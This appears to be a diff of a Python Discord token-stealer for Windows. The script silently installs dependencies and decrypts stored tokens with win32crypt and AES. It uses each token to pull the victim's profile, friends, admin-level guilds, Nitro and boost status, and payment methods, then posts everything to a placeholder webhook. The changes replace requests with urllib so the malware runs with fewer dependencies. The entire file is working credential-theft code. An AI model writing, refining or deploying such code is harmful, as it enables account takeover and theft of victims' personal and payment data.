@@ -1,12 +1,26 @@
 import os
 if os.name != "nt":
     exit()
+import subprocess
+import sys
 import json
-import requests
+import urllib.request
 import re
 import base64
-import win32crypt
 import datetime
+from dateutil import parser
+
+def install_and_import(modules):
+    for module, pip_name in modules:
+        try:
+            __import__(module)
+        except ImportError:
+            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            os.execl(sys.executable, sys.executable, *sys.argv)
+
+install_and_import([("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome")])
+
+import win32crypt
 from Crypto.Cipher import AES
 
 LOCAL = os.getenv("LOCALAPPDATA")
@@ -73,7 +87,8 @@ def getkey(path):
 
 def getip():
     try:
-        return requests.get("https://api.ipify.org?format=json").json().get("ip")
+        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
+            return json.loads(response.read().decode()).get("ip")
     except:
         return "None"
 
@@ -93,10 +108,10 @@ def main():
                     continue
                 checked.append(token)
 
-                res = requests.get('https://discord.com/api/v10/users/@me', headers=getheaders(token))
-                if res.status_code != 200:
+                res = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(token)))
+                if res.getcode() != 200:
                     continue
-                res_json = res.json()
+                res_json = json.loads(res.read().decode())
 
                 badges = ""
                 flags = res_json['flags']
@@ -107,16 +122,17 @@ def main():
                 if flags == 256 or flags == 288:
                     badges += ":BadgeBalance: "
 
-                res = requests.get('https://discordapp.com/api/v6/users/@me/relationships', headers=getheaders(token)).json()
+                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/relationships', headers=getheaders(token))).read().decode())
                 friends = len([x for x in res if x['type'] == 1])
 
-                res = requests.get('https://discordapp.com/api/v6/users/@me/guilds', params={"with_counts": True}, headers=getheaders(token)).json()
+                params = urllib.parse.urlencode({"with_counts": True})
+                res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/users/@me/guilds?{params}', headers=getheaders(token))).read().decode())
                 guilds = len(res)
                 guild_infos = ""
 
                 for guild in res:
                     if guild['permissions'] & 8 or guild['permissions'] & 32:
-                        res = requests.get(f'https://discordapp.com/api/v6/guilds/{guild["id"]}', headers=getheaders(token)).json()
+                        res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/guilds/{guild["id"]}', headers=getheaders(token))).read().decode())
                         vanity = ""
 
                         if res["vanity_url_code"] != None:
@@ -126,15 +142,15 @@ def main():
                 if guild_infos == "":
                     guild_infos = "No guilds"
 
-                res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token)).json()
+                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token))).read().decode())
                 has_nitro = False
                 has_nitro = bool(len(res) > 0)
                 exp_date = None
                 if has_nitro:
                     badges += f":BadgeSubscriber: "
-                    exp_date = datetime.datetime.strptime(res[0]["current_period_end"], "%Y-%m-%dT%H:%M:%S%z").strftime('%d/%m/%Y at %H:%M:%S')
+                    exp_date = parser.parse(res[0]["current_period_end"]).strftime('%d/%m/%Y at %H:%M:%S')
 
-                res = requests.get('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=getheaders(token)).json()
+                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=getheaders(token))).read().decode())
                 available = 0
                 print_boost = ""
                 boost = False
@@ -152,7 +168,7 @@ def main():
                 payment_methods = 0
                 type = ""
                 valid = 0
-                for x in requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=getheaders(token)).json():
+                for x in json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=getheaders(token))).read().decode()):
                     if x['type'] == 1:
                         type += "CreditCard "
                         if not x['invalid']:
@@ -186,8 +202,9 @@ def main():
                     "avatar_url": "https://avatars.githubusercontent.com/u/43183806?v=4"
                 }
 
-                requests.post('WEBHOOK_URL', json=embed_user, headers=getheaders())
-            except:
+                urllib.request.urlopen(urllib.request.Request('WEBHOOK_URL', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
+            except Exception as e:
+                print(e)
                 continue
 
 if __name__ == "__main__":
